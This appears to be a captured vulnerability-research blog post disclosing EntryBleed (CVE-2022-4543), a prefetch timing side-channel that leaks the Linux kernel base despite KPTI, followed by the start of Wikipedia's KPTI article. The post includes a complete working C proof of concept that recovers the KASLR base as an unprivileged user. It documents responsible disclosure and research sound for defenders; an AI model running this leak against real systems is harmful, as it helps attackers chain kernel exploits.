=== Content from www.willsroot.io_040e97ed_20250115_230246.html ===


# [Will's Root](https://www.willsroot.io/)

Vulnerability Research on Low-Level Systems

## Search This Blog

|  |  |
| --- | --- |

## Friday, December 16, 2022

### EntryBleed: Breaking KASLR under KPTI with Prefetch (CVE-2022-4543)

Recently, I’ve discovered that Linux KPTI has implementation issues that can allow any unprivileged local attacker to bypass KASLR on
Intel based systems. While technically only an info-leak, it still
provides a primitive that has serious implications for bugs previously
considered too hard to exploit and was assigned CVE-2022-4543. As you’ll see why from the writeup later
on, I have decided to term this attack “EntryBleed.”

[KPTI](https://en.wikipedia.org/wiki/Kernel_page-table_isolation)
(or its original name KAISER) stands for Kernel Page Table Isolation.
It was introduced as a patch for the Meltdown micro-architectural
vulnerabilities a few years ago, where unprivileged attackers could utilize a side channel to bypass KASLR. According to [documentation](https://www.kernel.org/doc/html/latest/x86/pti.html), KPTI basically splits apart the user and kernel page tables for each
process. The kernel still has all of userspace virtual memory mapped in,
but with the NX bit set; the user on the other hand will only have the
minimal amount of kernel virtual memory mapped in, like
exception/syscall entry handlers and anything else necessary for the
user to kernel transition. [KAISER](https://gruss.cc/files/kaiser.pdf) actually stood for “Kernel Address
Isolation to have Side-channels Efficiently Removed” and predates
Meltdown, as other side-channel bypasses were already known to be an
issue. If part of KPTI’s purpose is to act as a barrier against KASLR
bypasses for CPU side-channel attacks, then clearly it has failed as of
this post.

In 2016, Daniel Gruss discovered the concept of the [prefetch sidechannel](https://gruss.cc/files/prefetch.pdf).
I used one variant of it, which specifically utilized the TLB (the
caching mechanism for virtual to physical address translations) as a side-channel mechanism. x86\_64 has a group of prefetch instructions, which “prefetch” addresses into the CPU cache. A prefetch will finish quickly if the address being loaded is already present in the TLB, but will finish slower when the address is not present (and a page table walk needs to be done). At its time, it was known that ASLR (and KASLR) could be
bypassed by timing prefetches across a potential range of addresses
using high resolution timing instructions like “RDTSC.”

Before I continue with the attack, it must be noted that my main
inspiration came from Google ProjectZero’s recent blogpost on exploiting
[CVE-2022-42703](https://googleprojectzero.blogspot.com/2022/12/exploiting-CVE-2022-42703-bringing-back-the-stack-attack.html).
In the final section of the blogpost, they discuss how KPTI has been
left off as more modern CPUs have Meltdown mitigations in silicon, but
this makes them vulnerable to prefetch again. In this case, one would
just assume “Ok, let me enable KPTI again then.” To quote the post:
“kPTI was helpful in mitigating this side channel,” which would make
perfect sense based on the purpose of KPTI/KAISER and seemed to be the
consensus when talking to a few other security researcher friends.

For whatever reason, I had a gut feeling that something was wrong. I thought that maybe the minimal subset of kernel code that is still mapped while userspace code is running could be located with prefetch techniques. After an hour of digging, I noticed the following. In [`syscall_init`](https://elixir.bootlin.com/linux/v5.19.17/source/arch/x86/kernel/cpu/common.c#L2032), the address of [`entry_SYSCALL_64`](https://elixir.bootlin.com/linux/v5.19.17/source/arch/x86/entry/entry_64.S#L87)
(which is at a constant offset from KASLR base based on /proc/kallsyms) is stored in the LSTAR
MSR, which holds the address of the kernel’s handler for when a 64 bit syscall gets
executed. Notice how the handler executes a few instructions first
before switching to the kernel CR3 (if KPTI is on) - this means that
this function has to still be mapped in userspace page tables. I then
performed a manual page table walk in a debugger using the user CR3, and
it turns out that `entry_SYSCALL_64` is mapped at the same address in userland as it is in kernel using its KASLR rebased address - this sounds very suspicious!

At this point, I was quite confident that a prefetch side-channel could reveal the location of entry\_SYSCALL\_64, and since it seemed to be slid with the rest of the kernel, the KASLR base as well. The overall idea is just to repeatedly execute syscalls to ensure
that the page with `entry_SYSCALL_64` (hence the name
EntryBleed) gets cached in the instruction TLB, and then prefetch
side-channel the possible range of addresses for that handler (as the
kernel itself is guaranteed to be within 0xffffffff80000000 -
0xffffffffc0000000).

An astute reader might wonder how the entry is preserved upon returning to userland despite the CR3 write when switching to kernel page tables. This is most likely due to the global bit being set on this page's page table entry, which would protect it from TLB invalidation on mov instructions to CR3. In fact, [PTI](https://www.kernel.org/doc/Documentation/x86/pti.txt) documentation says the following: "global pages are disabled for all kernel structures not mapped into both kernel and userspace page tables." I originally suspected that PCID (which introduces separate TLB contexts to lower the occurrence of invalidation using the lower 12 bits of CR3) was the root cause as it often appears in discussions about performance optimization of Meltdown mitigations, but the [KPTI CR3 bitmask](https://elixir.bootlin.com/linux/v5.19.17/source/arch/x86/entry/entry_32.S#L54) shows no modifications to PCID. Perhaps I'm misunderstanding the code, so it would be great if someone can correct me if I'm wrong here.

Anyways, the resulting bypass is extremely simple. Unlike some other uarch
attacks, it seems to work fine under normal load in normal systems, and I
can deduce KASLR base on systems with KPTI with almost complete
accuracy by just averaging 100 iterations. Note that the measurement
code itself is from the original prefetch paper, with `cpuid` swapped with a fence instruction for it to work in VMs (credit goes to p0 for that technique). Below is my code (`entry_SYSCALL_64_offset` has to be adjusted based on kernel by setting it to the distance between it and startup\_64):

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#define KERNEL\_LOWER\_BOUND 0xffffffff80000000ull
#define KERNEL\_UPPER\_BOUND 0xffffffffc0000000ull
#define entry\_SYSCALL\_64\_offset 0x400000ull
uint64\_t sidechannel(uint64\_t addr) {
uint64\_t a, b, c, d;
asm volatile (".intel\_syntax noprefix;"
"mfence;"
"rdtscp;"
"mov %0, rax;"
"mov %1, rdx;"
"xor rax, rax;"
"lfence;"
"prefetchnta qword ptr [%4];"
"prefetcht2 qword ptr [%4];"
"xor rax, rax;"
"lfence;"
"rdtscp;"
"mov %2, rax;"
"mov %3, rdx;"
"mfence;"
".att\_syntax;"
: "=r" (a), "=r" (b), "=r" (c), "=r" (d)
: "r" (addr)
: "rax", "rbx", "rcx", "rdx");
a = (b << 32) | a;
c = (d << 32) | c;
return c - a;
}
#define STEP 0x100000ull
#define SCAN\_START KERNEL\_LOWER\_BOUND + entry\_SYSCALL\_64\_offset
#define SCAN\_END KERNEL\_UPPER\_BOUND + entry\_SYSCALL\_64\_offset
#define DUMMY\_ITERATIONS 5
#define ITERATIONS 100
#define ARR\_SIZE (SCAN\_END - SCAN\_START) / STEP
uint64\_t leak\_syscall\_entry(void)
{
uint64\_t data[ARR\_SIZE] = {0};
uint64\_t min = ~0, addr = ~0;
for (int i = 0; i < ITERATIONS + DUMMY\_ITERATIONS; i++)
{
for (uint64\_t idx = 0; idx < ARR\_SIZE; idx++)
{
uint64\_t test = SCAN\_START + idx \* STEP;
syscall(104);
uint64\_t time = sidechannel(test);
if (i >= DUMMY\_ITERATIONS)
data[idx] += time;
}
}
for (int i = 0; i < ARR\_SIZE; i++)
{
data[i] /= ITERATIONS;
if (data[i] < min)
{
min = data[i];
addr = SCAN\_START + i \* STEP;
}
printf("%llx %ld\n", (SCAN\_START + i \* STEP), data[i]);
}
return addr;
}
int main()
{
printf ("KASLR base %llx\n", leak\_syscall\_entry() - entry\_SYSCALL\_64\_offset);
}

KASLR bypassed on systems with KPTI in less than 100 lines of C!

I’ve managed to have this work on multiple Intel CPUs (including i5-8265U, i7-8750H,  i7-9700F, i7-9750H, Xeon(R) CPU E5-2640) - I got it working on some VPS
instances too but was unable to figure out the Intel CPU model there. It
seems to work across a wide range of kernel versions with KPTI - I’ve
tested it on Arch 6.0.12-hardened1-1-hardened, Ubuntu 5.15.0-56-generic, 6.0.12-1-MANJARO,
5.10.0-19-amd64, and a custom 5.18.3 build. It also works in KVM guests
to leak the guest OS KASLR base (one would need to forward the
host CPU features with "-cpu host" in QEMU for prefetch to even work though). I'm not sure how the TLB side-effects are preserved in a VM scenario though across CR3 writes and potential VM exits - if anyone has ideas, please let me know! As of now, I don’t
think this attack affects AMD, but I also don't have direct access to any AMD hardware (see edit in the end). Lastly, I don't believe the repeated syscalls are necessary in my exploit as later tests show that it worked without making them with each measurement most likely due to the global bit, but I still kept it in my exploit just to guarantee its existence in the TLB.

Here is a demonstration of it (kernel base is printed before the shell for comparison purposes):

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh0aBNoBcKz3-EQBc9uoZOoiGZLiMgFXS-yElT8s7mlpjcsDi8JMGQ1dURbea3t0r1rQULWTPUpqUaTmWM1kV2kzoDzkRA-fdBKwIUBQWcR8nHkufKMc6ZzngZRyH_kFjao25jmPfSWu8YwOVICnHdTNOhKLY33Nnh1Qxv5NNhZDoKeIlLkA_W6aK3CJw/s16000/demo.gif)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh0aBNoBcKz3-EQBc9uoZOoiGZLiMgFXS-yElT8s7mlpjcsDi8JMGQ1dURbea3t0r1rQULWTPUpqUaTmWM1kV2kzoDzkRA-fdBKwIUBQWcR8nHkufKMc6ZzngZRyH_kFjao25jmPfSWu8YwOVICnHdTNOhKLY33Nnh1Qxv5NNhZDoKeIlLkA_W6aK3CJw/s600/demo.gif)

One thing that could be done for increasing reliability would be accessing a lot
of userspace addresses beforehand at specific strides to evict the TLB
(and avoid false answers from other cached kernel addresses, which I saw with higher frequency on some systems). I also
hypothesize that in scenarios without KPTI (like in ProjectZero’s case),
prefetch would work even better if one were to trigger a specific
codepath in kernel and specifically hunt for that offset during the
side-channel.

In conclusion, Linux KPTI doesn’t do it’s job and it’s still quite easy to get KASLR base. I’ve already emailed security@kernel.org
as well as relevant mailing lists for distros, and was authorized to
disclose this as a potential fix might take a while. I’m honestly not
too sure what the best approach to fix this as it’s more of an implementation issue, but I suggested that to randomize the virtual address of
entry/exit handlers that are mapped into userspace, have them be at a fixed virtual address unrelated to kernel base, or have a randomized
offset from kernel base. I suspect that this problem might really
just be due to a major oversight; one kernel developer mentioned to me that this
was definitely not the intent and might have been a regression.

I’ll end this post with some acknowledgements. A huge shoutout must go to my uarch security mentor [Joseph Ravichandran](https://twitter.com/0xjprx) from MIT CSAIL for guiding me throughout this field of research and advising me a lot on this bug. He introduced me to prefetch attacks through the [Secure Hardware Design course](http://csg.csail.mit.edu/6.888Yan/) from Professor Mengjia Yan - one
of their final labs is actually about bypassing userland ASLR using
prefetch. Thanks must go to Seth Jenkins at ProjectZero for the original
inspiration too, and [D3v17](https://syst3mfailure.io/) for his support and extensive testing. As always, feel free to ask questions or point out any
mistakes in my explanations!

Edit (12/18/2022): As [bcoles](https://github.com/bcoles) later informed me, a generic prefetch attack seems to work for some AMD CPUs, which isn't surprising given [this paper](https://www.usenix.org/system/files/sec22-lipp.pdf) and this [security advisory](https://www.amd.com/en/corporate/product-security/bulletin/amd-sb-1017). However, it's also important to note that this would basically be the same attack as ProjectZero discussed originally, as AMD was not affected by Meltdown so KPTI was never enabled for their processors.

Posted by
willsroot

at

[1:00 PM](https://www.willsroot.io/2022/12/entrybleed.html "permanent link")

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=8814147965526194982&postID=26313127375362264&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=8814147965526194982&postID=26313127375362264&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=8814147965526194982&postID=26313127375362264&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=8814147965526194982&postID=26313127375362264&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=8814147965526194982&postID=26313127375362264&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=8814147965526194982&postID=26313127375362264&target=pinterest "Share to Pinterest")

#### 8 comments:

1. ![](//resources.blogblog.com/img/blank.gif)Anonymous[December 17, 2022 at 1:31 PM](https://www.willsroot.io/2022/12/entrybleed.html?showComment=1671312704737#c4032729208706937375)

   **Woah**

   Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=8814147965526194982&postID=4032729208706937375)Replies
   - ![](//resources.blogblog.com/img/blank.gif)Anonymous[December 17, 2022 at 1:32 PM](https://www.willsroot.io/2022/12/entrybleed.html?showComment=1671312745021#c7294990829046480977)

     *That's so cool*

     [Delete](https://www.blogger.com/delete-comment.g?blogID=8814147965526194982&postID=7294990829046480977)Replies
     Reply
   Reply
2. ![](//resources.blogblog.com/img/blank.gif)Anonymous[December 18, 2022 at 8:09 AM](https://www.willsroot.io/2022/12/entrybleed.html?showComment=1671379764942#c1374890185043963212)

   Insanely cool find :) Congratulations!

   Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=8814147965526194982&postID=1374890185043963212)Replies
   Reply
3. ![](//resources.blogblog.com/img/blank.gif)Anonymous[December 27, 2022 at 9:19 AM](https://www.willsroot.io/2022/12/entrybleed.html?showComment=1672161564237#c5461205296162402616)

   5+
   Program works, I tested it on my Linux

   Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=8814147965526194982&postID=5461205296162402616)Replies
   Reply
4. ![](//resources.blogblog.com/img/blank.gif)Anonymous[January 17, 2023 at 10:59 AM](https://www.willsroot.io/2022/12/entrybleed.html?showComment=1673981946948#c9010287462668502974)

   does this work in a VM?

   Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=8814147965526194982&postID=9010287462668502974)Replies
   - ![](//resources.blogblog.com/img/blank.gif)Anonymous[January 25, 2023 at 5:54 PM](https://www.willsroot.io/2022/12/entrybleed.html?showComment=1674698081768#c6216969485574232377)

     Yes, this does work in a virtual machine. This implementation - https://github.com/bcoles/kasld/blob/master/src/entrybleed.c (which uses Will's proof of concept code) has been tested in VMware virtual machines running on both Intel and AMD CPUs.

     [Delete](https://www.blogger.com/delete-comment.g?blogID=8814147965526194982&postID=6216969485574232377)Replies
     Reply
   Reply
5. ![](//resources.blogblog.com/img/blank.gif)Anonymous[March 29, 2023 at 6:27 PM](https://www.willsroot.io/2022/12/entrybleed.html?showComment=1680139664367#c2601687449605978799)

   Now is end of March 2023, do you communicate with the linux kernel community that this flaw will or will not be patched in the future since the patch seems difficult.

   Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=8814147965526194982&postID=2601687449605978799)Replies
   Reply
6. ![](//resources.blogblog.com/img/blank.gif)Raphgui[April 27, 2023 at 3:16 AM](https://www.willsroot.io/2022/12/entrybleed.html?showComment=1682590578041#c4414345288183709147)

   This is crazy, congratz !!

   Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=8814147965526194982&postID=4414345288183709147)Replies
   Reply

Add commentLoad more...

[Newer Post](https://www.willsroot.io/2023/08/vmquack-avx512.html "Newer Post")

[Older Post](https://www.willsroot.io/2022/08/reviving-exploits-against-cred-struct.html "Older Post")

[Home](https://www.willsroot.io/)

Subscribe to:
[Post Comments (Atom)](https://www.willsroot.io/feeds/26313127375362264/comments/default)

## Contact

For further inquiries, contact me at will@willsroot.io. Feel free to use my [PGP key](/p/pgp-key.html).

## Publications

[EntryBleed: A Universal KASLR Bypass against KPTI on Linux](https://dl.acm.org/doi/pdf/10.1145/3623652.3623669)

## Github

Click [here](https://github.com/BitsByWill) to access my Github page.

## Blog Archive

* ►
  [2024](https://www.willsroot.io/2024/)
  (2)
  + ►
    [August](https://www.willsroot.io/2024/08/)
    (2)

* ►
  [2023](https://www.willsroot.io/2023/)
  (3)
  + ►
    [August](https://www.willsroot.io/2023/08/)
    (3)

* ▼
  [2022](https://www.willsroot.io/2022/)
  (4)
  + ▼
    [December](https://www.willsroot.io/2022/12/)
    (1)
    - [EntryBleed: Breaking KASLR under KPTI with Prefetc...](https://www.willsroot.io/2022/12/entrybleed.html)
  + ►
    [August](https://www.willsroot.io/2022/08/)
    (1)
  + ►
    [March](https://www.willsroot.io/2022/03/)
    (1)
  + ►
    [January](https://www.willsroot.io/2022/01/)
    (1)

* ►
  [2021](https://www.willsroot.io/2021/)
  (10)
  + ►
    [October](https://www.willsroot.io/2021/10/)
    (1)
  + ►
    [August](https://www.willsroot.io/2021/08/)
    (3)
  + ►
    [July](https://www.willsroot.io/2021/07/)
    (1)
  + ►
    [April](https://www.willsroot.io/2021/04/)
    (2)
  + ►
    [March](https://www.willsroot.io/2021/03/)
    (1)
  + ►
    [February](https://www.willsroot.io/2021/02/)
    (1)
  + ►
    [January](https://www.willsroot.io/2021/01/)
    (1)

* ►
  [2020](https://www.willsroot.io/2020/)
  (10)
  + ►
    [December](https://www.willsroot.io/2020/12/)
    (1)
  + ►
    [November](https://www.willsroot.io/2020/11/)
    (1)
  + ►
    [October](https://www.willsroot.io/2020/10/)
    (2)
  + ►
    [June](https://www.willsroot.io/2020/06/)
    (3)
  + ►
    [May](https://www.willsroot.io/2020/05/)
    (2)
  + ►
    [April](https://www.willsroot.io/2020/04/)
    (1)

* ►
  [2019](https://www.willsroot.io/2019/)
  (19)
  + ►
    [November](https://www.willsroot.io/2019/11/)
    (2)
  + ►
    [October](https://www.willsroot.io/2019/10/)
    (6)
  + ►
    [September](https://www.willsroot.io/2019/09/)
    (6)
  + ►
    [August](https://www.willsroot.io/2019/08/)
    (3)
  + ►
    [June](https://www.willsroot.io/2019/06/)
    (1)
  + ►
    [March](https://www.willsroot.io/2019/03/)
    (1)

* ►
  [2016](https://www.willsroot.io/2016/)
  (1)
  + ►
    [July](https://www.willsroot.io/2016/07/)
    (1)

## Featured Post

### [corCTF 2021 Fire of Salvation Writeup: Utilizing msg\_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel](https://www.willsroot.io/2021/08/corctf-2021-fire-of-salvation-writeup.html)

In corCTF 2021, D3v17 and I wrote two kernel challenges utilizing a technique that is novel at least to our knowledge to gain arb read and ...

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhk7_f3cfmXJLNVS18Z4v30D8hMI069XR0flo8U79_0jCIA-KJVD7z4yo4eRPlqd1cvCJyGoVw4cPqL39nfJUqnROpHbr_fCeBmNUhVhyPicqcYZvWC-yMl-N5_fep_xuxmEP3xkXQD9MyH/w640-h409/1.png)

## Popular Posts

* [![](https://blogger.googleusercontent.com/img/a/AVvXsEhQxppxQVEFTI_8LvhYfn8UVvmerOlNEsAyQ4SILvl3a4dGeg-oONk-QVcrj5h5uYpymjwnDOUcY603sd-PjjqyS4bufe453DQtWcmoD9UW8mn8oXMJr2WwB7CULB6mn986c1QkCnqsIAWviAZUf9O3W8ZS7au5q0dkjUjO5IW_QHwyjLzH5_nwnzUXVg=w72-h72-p-k-no-nu)](https://www.willsroot.io/2022/01/cve-2022-0185.html)

  [CVE-2022-0185 - Winning a $31337 Bounty after Pwning Ubuntu and Escaping Google's KCTF Containers](https://www.willsroot.io/2022/01/cve-2022-0185.html)
  Recently, several friends on my CTF team Crusaders of Rust and I found a Linux kernel heap overflow 0-day. We found the bug through fuzzi...
* [![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh0aBNoBcKz3-EQBc9uoZOoiGZLiMgFXS-yElT8s7mlpjcsDi8JMGQ1dURbea3t0r1rQULWTPUpqUaTmWM1kV2kzoDzkRA-fdBKwIUBQWcR8nHkufKMc6ZzngZRyH_kFjao25jmPfSWu8YwOVICnHdTNOhKLY33Nnh1Qxv5NNhZDoKeIlLkA_W6aK3CJw/w72-h72-p-k-no-nu/demo.gif)](https://www.willsroot.io/2022/12/entrybleed.html)

  [EntryBleed: Breaking KASLR under KPTI with Prefetch (CVE-2022-4543)](https://www.willsroot.io/2022/12/entrybleed.html)
  Recently, I’ve discovered that Linux KPTI has implementation issues that can allow any unprivileged local attacker to bypass KASLR on Intel...
* [![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhk7_f3cfmXJLNVS18Z4v30D8hMI069XR0flo8U79_0jCIA-KJVD7z4yo4eRPlqd1cvCJyGoVw4cPqL39nfJUqnROpHbr_fCeBmNUhVhyPicqcYZvWC-yMl-N5_fep_xuxmEP3xkXQD9MyH/w72-h72-p-k-no-nu/1.png)](https://www.willsroot.io/2021/08/corctf-2021-fire-of-salvation-writeup.html)

  [corCTF 2021 Fire of Salvation Writeup: Utilizing msg\_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel](https://www.willsroot.io/2021/08/corctf-2021-fire-of-salvation-writeup.html)
  In corCTF 2021, D3v17 and I wrote two kernel challenges utilizing a technique that is novel at least to our knowledge to gain arb read and ...

## Interesting Posts

## Subscribe To This Blog

![](https://resources.blogblog.com/img/widgets/arrow_dropdown.gif)
![](https://resources.blogblog.com/img/icon_feed12.png)
Posts

[![](https://resources.blogblog.com/img/widgets/subscribe-netvibes.png)](https://www.netvibes.com/subscribe.php?url=https%3A%2F%2Fwww.willsroot.io%2Ffeeds%2Fposts%2Fdefault)
[![](https://resources.blogblog.com/img/widgets/subscribe-yahoo.png)](https://add.my.yahoo.com/content?url=https%3A%2F%2Fwww.willsroot.io%2Ffeeds%2Fposts%2Fdefault)
[![](https://resources.blogblog.com/img/icon_feed12.png)
Atom](https://www.willsroot.io/feeds/posts/default)

![](https://resources.blogblog.com/img/widgets/arrow_dropdown.gif)
![](https://resources.blogblog.com/img/icon_feed12.png)
Posts

![](https://resources.blogblog.com/img/widgets/arrow_dropdown.gif)
![](https://resources.blogblog.com/img/icon_feed12.png)
Comments

[![](https://resources.blogblog.com/img/widgets/subscribe-netvibes.png)](https://www.netvibes.com/subscribe.php?url=https%3A%2F%2Fwww.willsroot.io%2Ffeeds%2F26313127375362264%2Fcomments%2Fdefault)
[![](https://resources.blogblog.com/img/widgets/subscribe-yahoo.png)](https://add.my.yahoo.com/content?url=https%3A%2F%2Fwww.willsroot.io%2Ffeeds%2F26313127375362264%2Fcomments%2Fdefault)
[![](https://resources.blogblog.com/img/icon_feed12.png)
Atom](https://www.willsroot.io/feeds/26313127375362264/comments/default)

![](https://resources.blogblog.com/img/widgets/arrow_dropdown.gif)
![](https://resources.blogblog.com/img/icon_feed12.png)
Comments

|  |  |
| --- | --- |

Picture Window theme. Powered by [Blogger](https://www.blogger.com).



=== Content from en.wikipedia.org_8899fe65_20250115_230246.html ===
[Jump to content](#bodyContent)

Main menu

Main menu
move to sidebar
hide

Navigation

* [Main page](/wiki/Main_Page "Visit the main page [z]")
* [Contents](/wiki/Wikipedia%3AContents "Guides to browsing Wikipedia")
* [Current events](/wiki/Portal%3ACurrent_events "Articles related to current events")
* [Random article](/wiki/Special%3ARandom "Visit a randomly selected article [x]")
* [About Wikipedia](/wiki/Wikipedia%3AAbout "Learn about Wikipedia and how it works")
* [Contact us](//en.wikipedia.org/wiki/Wikipedia%3AContact_us "How to contact Wikipedia")

Contribute

* [Help](/wiki/Help%3AContents "Guidance on how to use and edit Wikipedia")
* [Learn to edit](/wiki/Help%3AIntroduction "Learn how to edit Wikipedia")
* [Community portal](/wiki/Wikipedia%3ACommunity_portal "The hub for editors")
* [Recent changes](/wiki/Special%3ARecentChanges "A list of recent changes to Wikipedia [r]")
* [Upload file](/wiki/Wikipedia%3AFile_upload_wizard "Add images or other media for use on Wikipedia")

[![](/static/images/icons/wikipedia.png)
![Wikipedia](/static/images/mobile/copyright/wikipedia-wordmark-en.svg)
![The Free Encyclopedia](/static/images/mobile/copyright/wikipedia-tagline-en.svg)](/wiki/Main_Page)

[Search](/wiki/Special%3ASearch "Search Wikipedia [f]")

Search

Appearance

* [Donate](https://donate.wikimedia.org/?wmf_source=donate&wmf_medium=sidebar&wmf_campaign=en.wikipedia.org&uselang=en)
* [Create account](/w/index.php?title=Special:CreateAccount&returnto=Kernel+page-table+isolation "You are encouraged to create an account and log in; however, it is not mandatory")
* [Log in](/w/index.php?title=Special:UserLogin&returnto=Kernel+page-table+isolation "You're encouraged to log in; however, it's not mandatory. [o]")

Personal tools

* [Donate](https://donate.wikimedia.org/?wmf_source=donate&wmf_medium=sidebar&wmf_campaign=en.wikipedia.org&uselang=en)
* [Create account](/w/index.php?title=Special:CreateAccount&returnto=Kernel+page-table+isolation "You are encouraged to create an account and log in; however, it is not mandatory")
* [Log in](/w/index.php?title=Special:UserLogin&returnto=Kernel+page-table+isolation "You're encouraged to log in; however, it's not mandatory. [o]")

Pages for logged out editors [learn more](/wiki/Help%3AIntroduction)

* [Contributions](/wiki/Special%3AMyContributions "A list of edits made from this IP address [y]")
* [Talk](/wiki/Special%3AMyTalk "Discussion about edits from this IP address [n]")

## Contents

move to sidebar
hide

* (Top)
* [1
  Background on KAISER](#Background_on_KAISER)
* [2
  Meltdown vulnerability and KPTI](#Meltdown_vulnerability_and_KPTI)
* [3
  Implementation](#Implementation)
* [4
  References](#References)
* [5
  External links](#External_links)

Toggle the table of contents

# Kernel page-table isolation

8 languages

* [العربية](https://ar.wikipedia.org/wiki/%D8%B9%D8%B2%D9%84_%D9%84%D8%A7%D8%A6%D8%AD%D8%A9_%D8%A7%D9%84%D9%86%D9%88%D8%A7%D8%A9 "عزل لائحة النواة – Arabic")
* [Deutsch](https://de.wikipedia.org/wiki/Kernel_page-table_isolation "Kernel page-table isolation – German")
* [Español](https://es.wikipedia.org/wiki/Aislamiento_de_tablas_de_p%C3%A1ginas_del_n%C3%BAcleo "Aislamiento de tablas de páginas del núcleo – Spanish")
* [فارسی](https://fa.wikipedia.org/wiki/%D8%AC%D8%AF%D8%A7%D8%B3%D8%A7%D8%B2%DB%8C_%D8%AC%D8%AF%D9%88%D9%84_%D8%B5%D9%81%D8%AD%D9%87_%D9%87%D8%B3%D8%AA%D9%87 "جداسازی جدول صفحه هسته – Persian")
* [Português](https://pt.wikipedia.org/wiki/Isolamento_da_tabela_de_p%C3%A1gina_do_Kernel "Isolamento da tabela de página do Kernel – Portuguese")
* [Українська](https://uk.wikipedia.org/wiki/KPTI "KPTI – Ukrainian")
* [Tiếng Việt](https://vi.wikipedia.org/wiki/C%C3%A1ch_ly_b%E1%BA%A3ng_trang_kernel "Cách ly bảng trang kernel – Vietnamese")
* [中文](https://zh.wikipedia.org/wiki/%E5%86%85%E6%A0%B8%E9%A1%B5%E8%A1%A8%E9%9A%94%E7%A6%BB "内核页表隔离 – Chinese")

[Edit links](https://www.wikidata.org/wiki/Special%3AEntityPage/Q47001556#sitelinks-wikipedia "Edit interlanguage links")

* [Article](/wiki/Kernel_page-table_isolation "View the content page [c]")
* [Talk](/wiki/Talk%3AKernel_page-table_isolation "Discuss improvements to the content page [t]")

English

* [Read](/wiki/Kernel_page-table_isolation)
* [Edit](/w/index.php?title=Kernel_page-table_isolation&action=edit "Edit this page [e]")
* [View history](/w/index.php?title=Kernel_page-table_isolation&action=history "Past revisions of this page [h]")

Tools

Tools
move to sidebar
hide

Actions

* [Read](/wiki/Kernel_page-table_isolation)
* [Edit](/w/index.php?title=Kernel_page-table_isolation&action=edit "Edit this page [e]")
* [View history](/w/index.php?title=Kernel_page-table_isolation&action=history)

General

* [What links here](/wiki/Special%3AWhatLinksHere/Kernel_page-table_isolation "List of all English Wikipedia pages containing links to this page [j]")
* [Related changes](/wiki/Special%3ARecentChangesLinked/Kernel_page-table_isolation "Recent changes in pages linked from this page [k]")
* [Upload file](/wiki/Wikipedia%3AFile_Upload_Wizard "Upload files [u]")
* [Special pages](/wiki/Special%3ASpecialPages "A list of all special pages [q]")
* [Permanent link](/w/index.php?title=Kernel_page-table_isolation&oldid=1240427761 "Permanent link to this revision of this page")
* [Page information](/w/index.php?title=Kernel_page-table_isolation&action=info "More information about this page")
* [Cite this page](/w/index.php?title=Special:CiteThisPage&page=Kernel_page-table_isolation&id=1240427761&wpFormIdentifier=titleform "Information on how to cite this page")
* [Get shortened URL](/w/index.php?title=Special:UrlShortener&url=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FKernel_page-table_isolation)
* [Download QR code](/w/index.php?title=Special:QrCode&url=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FKernel_page-table_isolation)

Print/export

* [Download as PDF](/w/index.php?title=Special:DownloadAsPdf&page=Kernel_page-table_isolation&action=show-download-screen "Download this page as a PDF file")
* [Printable version](/w/index.php?title=Kernel_page-table_isolation&printable=yes "Printable version of this page [p]")

In other projects

* [Wikidata item](https://www.wikidata.org/wiki/Special%3AEntityPage/Q47001556 "Structured data on this page hosted by Wikidata [g]")

Appearance
move to sidebar
hide

From Wikipedia, the free encyclopedia

"KPTI" redirects here. For other uses, see [KPTI (disambiguation)](/wiki/KPTI_%28disambiguation%29 "KPTI (disambiguation)").
[![](//upload.wikimedia.org/wikipedia/commons/thumb/3/33/Kernel_page-table_isolation.svg/300px-Kernel_page-table_isolation.svg.png)](/wiki/File%3AKernel_page-table_isolation.svg)

One set of page table for use in kernel mode includes both kernel-space and user-space. The second set of page table for use in user mode contains a copy of user-space and a minimal set of kernel-space handling system calls and interrupts.

**Kernel page-table isolation** (**KPTI** or **PTI**,[[1]](#cite_note-phoronix-more-x86pti-1) previously called **KAISER**)[[2]](#cite_note-:22-2)[[3]](#cite_note-3) is a [Linux kernel](/wiki/Linux_kernel "Linux kernel") feature that mitigates the [Meltdown security vulnerability](/wiki/Meltdown_%28security_vulnerability%29 "Meltdown (security vulnerability)") (affecting mainly [Intel](/wiki/Intel "Intel")'s [x86](/wiki/X86 "X86") [CPUs](/wiki/CPU "CPU"))[[4]](#cite_note-:4-4) and improves kernel hardening against attempts to bypass [kernel address space layout randomization](/wiki/Kernel_address_space_layout_randomization "Kernel address space layout randomization") (KASLR). It works by better isolating [user space](/wiki/User_space "User space") and kernel space memory.[[5]](#cite_note-:0-5)[[6]](#cite_note-:1-6) KPTI was merged into Linux kernel version 4.15,[[7]](#cite_note-:2-7) and [backported](/wiki/Backport "Backport") to Linux kernels 4.14.11, 4.9.75, and 4.4.110.[[8]](#cite_note-8)[[9]](#cite_note-9)[[10]](#cite_note-10) [Windows](/wiki/Microsoft_Windows "Microsoft Windows")[[11]](#cite_note-11) and [macOS](/wiki/MacOS "MacOS")[[12]](#cite_note-12) released similar updates. KPTI does not address the related [Spectre](/wiki/Spectre_%28security_vulnerability%29 "Spectre (security vulnerability)") vulnerability.[[13]](#cite_note-:3-13)

## Background on KAISER

[[edit](/w/index.php?title=Kernel_page-table_isolation&action=edit&section=1 "Edit section: Background on KAISER")]

